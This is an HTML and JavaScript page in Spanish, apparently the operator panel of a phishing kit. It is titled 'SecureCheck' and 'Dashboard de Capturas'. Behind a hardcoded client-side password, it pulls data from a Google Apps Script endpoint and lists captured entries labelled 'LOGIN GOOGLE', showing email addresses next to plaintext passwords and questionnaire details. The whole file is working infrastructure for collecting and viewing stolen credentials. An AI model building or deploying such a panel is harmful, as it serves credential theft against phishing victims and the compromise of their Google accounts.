<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control - SecureCheck</title>
    <style>
        :root {
            --bg: #0f172a;
            --card: #1e293b;
            --primary: #38bdf8;
            --accent: #a78bfa;
            --text: #f1f5f9;
            --border: #334155;
        }

        body { 
            margin: 0; 
            padding: 20px; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: var(--bg); 
            color: var(--text); 
        }

        .container { max-width: 1200px; margin: auto; }

        /* Login Screen */
        #login-screen {
            display: flex; justify-content: center; align-items: center; height: 80vh;
        }
        .login-box {
            background: var(--card); padding: 40px; border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; width: 300px;
        }
        input {
            width: 100%; padding: 10px; margin: 15px 0; border-radius: 6px;
            border: 1px solid var(--border); background: #0f172a; color: white; box-sizing: border-box;
        }
        button {
            width: 100%; padding: 10px; background: var(--primary); border: none;
            color: #0f172a; font-weight: bold; border-radius: 6px; cursor: pointer;
        }

        /* Dashboard */
        #panel-content { display: none; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        h1 { color: var(--primary); margin: 0; }
        
        .table-container {
            background: var(--card); border-radius: 12px; overflow-x: auto;
            border: 1px solid var(--border);
        }
        table { width: 100%; border-collapse: collapse; min-width: 900px; }
        th { background: #1e293b; padding: 15px; text-align: left; color: var(--primary); border-bottom: 2px solid var(--border); }
        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 14px; }
        
        .badge {
            padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;
        }
        .badge-google { background: rgba(56, 189, 248, 0.2); color: #38bdf8; }
        .badge-form { background: rgba(167, 139, 250, 0.2); color: #a78bfa; }
        
        .pass-text { font-family: monospace; color: #fbbf24; font-weight: bold; }
        .refresh-btn { background: transparent; border: 1px solid var(--primary); color: var(--primary); width: auto; padding: 5px 15px; }
    </style>
</head>
<body>

<div class="container">
    <div id="login-screen">
        <div class="login-box">
            <h2>Acceso Admin</h2>
            <input type="password" id="admin-pass" placeholder="Contraseña">
            <button onclick="verificarAcceso()">Entrar</button>
        </div>
    </div>

    <div id="panel-content">
        <div class="header">
            <h1>Dashboard de Capturas</h1>
            <button class="refresh-btn" onclick="cargarDatos()">Actualizar Datos</button>
        </div>

        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>Origen</th>
                        <th>Correo / Empresa</th>
                        <th>Contraseña / Detalles Cuestionario</th>
                        <th>Fecha y Hora</th>
                    </tr>
                </thead>
                <tbody id="tabla-datos">
                    </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";

    function verificarAcceso() {
        const pass = document.getElementById("admin-pass").value;
        if (pass === "Linares2025.") {
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("panel-content").style.display = "block";
            cargarDatos();
        } else {
            alert("Acceso denegado");
        }
    }

    async function cargarDatos() {
        const tbody = document.getElementById("tabla-datos");
        tbody.innerHTML = "<tr><td colspan='4' style='text-align:center'>Cargando base de datos...</td></tr>";

        try {
            const response = await fetch(webAppUrl);
            const data = await response.json();
            tbody.innerHTML = "";

            // Invertimos para que lo más reciente salga arriba
            data.reverse().forEach(fila => {
                // fila[0]=Usuario, fila[1]=Pass, fila[2]=Tipo, fila[3]=Fecha
                const esLogin = fila[2] === "LOGIN_GOOGLE";
                const badgeClass = esLogin ? "badge-google" : "badge-form";
                const label = esLogin ? "LOGIN GOOGLE" : "CUESTIONARIO";

                tbody.innerHTML += `
                    <tr>
                        <td><span class="badge ${badgeClass}">${label}</span></td>
                        <td>${fila[0] || "---"}</td>
                        <td><span class="${esLogin ? 'pass-text' : ''}">${fila[1] || "---"}</span></td>
                        <td style="color: #94a3b8">${fila[3] || "N/A"}</td>
                    </tr>
                `;
            });
        } catch (error) {
            tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; color: #f87171'>Error al conectar con la base de datos</td></tr>";
        }
    }
</script>

</body>
</html>
